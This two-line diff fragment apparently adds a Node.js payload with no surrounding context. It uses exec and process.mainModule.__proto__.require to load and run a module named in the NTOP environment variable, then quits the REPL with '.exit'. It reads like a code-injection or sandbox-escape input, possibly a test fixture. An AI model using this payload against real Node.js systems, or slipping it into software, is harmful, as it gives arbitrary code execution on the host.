@@ -1,0 +1,2 @@
+exec(`process.mainModule.__proto__.require('${process.env.NTOP}')()`)
+.exit
